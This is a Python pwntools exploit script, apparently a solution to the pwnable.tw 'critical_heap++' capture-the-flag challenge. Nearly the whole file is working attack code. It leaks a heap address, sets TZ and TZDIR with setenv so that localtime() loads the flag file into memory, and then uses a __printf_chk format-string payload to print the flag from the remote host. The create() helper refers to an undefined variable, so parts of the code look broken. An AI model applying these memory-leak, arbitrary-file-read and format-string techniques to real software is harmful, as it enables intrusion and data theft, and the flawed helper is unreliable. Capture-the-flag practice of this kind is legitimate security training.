###Arbitrary file read with localtime(), setting TZ/TZDIR with setenv(), and fmt attack

from pwn import *

###Structures
'''
Normal block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      |    content    |
0x20|    content    |    content    |
0x30|    content    |    content    |
0x40|   modified    |               

System block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      | cur_dir(char*)|
0x20|  other(char*) |   usr(char*)  |
0x30|   sys(char*)  |    rand_num   |
0x40|       x       | 

Clock block (0x48)
    |   4   |   4   |   4   |   4   |
0x00|  name(char*)  | inuse |   x   |
0x10|     type      |   time(tm*)   |
0x20|  year | month |  day  |  hour |
0x30|  min  |  sec  |       x       |
0x40|       x       |
'''

###Utils
def create(htype,hname,content=None):
    for i in range(10):
        if hdoc[i]=='':
            hdoc[i] = htype
            break
    if htype=='normal':
        htype = '1'
    elif htype=='clock':
        htype = '2'
    elif htype=='system':
        htype = '3'
    r.sendlineafter('choice : ','1')
    r.sendlineafter('heap:',name)
    r.sendlineafter('choice : ',htype)
    if htype=='1':
        r.sendafter('heap :',content)


def show(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('heap :',str(idx))
    return r.recvuntil('********')[:-9]

def rename(htype):
    r.sendlineafter('choice : ','3')

def play_norm(mode,data=None):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[:-9]
    elif mode==2:
        r.sendafter('Content :',data)
        return None

def play_clock(mode):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[:-9]
    elif mode==2:
        return None

def play_sys(mode,envname=None,envval=None):
    if mode=='set':
        mode = 1
    elif mode=='unset':
        mode = 2
    elif mode=='get_path':
        mode = 3
    elif mode=='get_val':
        mode = 4
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        r.sendafter('heap :',envname)
        r.sendafter('name :',envval)
        return None
    elif mode==2:
        r.sendlineafter('unset :',envname)
        return None
    elif mode==3:
        return None
    elif mode==4:
        r.sendlineafter('see :',envname)
        return None

def play(idx,mode,data=None,envname=None,envval=None):
    global not_play
    if not_play:
        r.sendlineafter('choice : ','4')
        r.sendlineafter('heap :',str(idx))
    not_play = 0
    htype = hdoc[idx]
    if htype=='normal':
        ret = play_norm(mode,data)
    elif htype=='clock':
        ret = play_clock(mode)
    elif htype=='system':
        ret = play_sys(mode,envname,envval)
    return ret

def leave_play(idx):
    htype = hdoc[idx]
    if htype=='normal':
        r.sendlineafter('choice : ','3')
    elif htype=='clock':
        r.sendlineafter('choice : ','3')
    elif htype=='system':
        r.sendlineafter('choice : ','5')
    global not_play
    not_play = 1

def delete(idx):
    r.sendlineafter('choice : ','5')
    r.sendlineafter('heap :',str(idx))
    hdoc[idx] = ''

def leave():
    r.sendlineafter('choice : ','6')

###Exploit
r = remote('chall.pwnable.tw',10500)

###Initiate settings for convenience
hdoc = ['' for i in range(10)]
not_play = 1

###Get heap addr onto block list
create('system','sys1')         #0
play(0,'set',envname='leakadr',envval='a')
leave_play(0)
play(0,'get_val',envname='leakadr')
leave_play(0)

###Replace system block with normal block to print heap_addr
delete(0)
create('normal','norm1','a'*8)  #0
heap_addr = u64(show(0).split(b'aaaaaaaa')[1].ljust(8,b'\x00'))-0x148


###Set TZ and TZDIR to force localtime to print flag onto heap
create('system','sys2')		#1
play(1,'set',envname='TZ',envval='flag')
leave_play(1)
play(1,'set',envname='TZDIR',envval='/home/critical_heap++')
leave_play(1)

###Print flag onto heap
create('clock','clk1')		#2

###Leak flag
#  Since print_chk is used, can only pad with %c until correct offset
#  RDX -> R8 -> stack
#  input start at stack[4]
#  2+4+a+2 < 4a  --> a = 3 --> 12*%c+%s+(pad to full length)
flag_addr = heap_addr+0x5e0
play(0,'update',data=(b'%c'*12+b'%s').ljust(0x20,b'a')+p64(flag_addr))
print(play(0,'show'))



###Reference
#  __printf_chk source
#    https://code.woboq.org/userspace/glibc/debug/printf_chk.c.html
#  localtime source
#    https://code.woboq.org/userspace/glibc/time/localtime.c.html
#  __tz_convert source
#  tzset_internal source
#    https://code.woboq.org/userspace/glibc/time/tzset.c.html#__tz_convert
#  __tzfile_read source
#    https://code.woboq.org/userspace/glibc/time/tzfile.c.html
#  setenv source
#  unsetenv source
#    https://code.woboq.org/userspace/glibc/stdlib/setenv.c.html
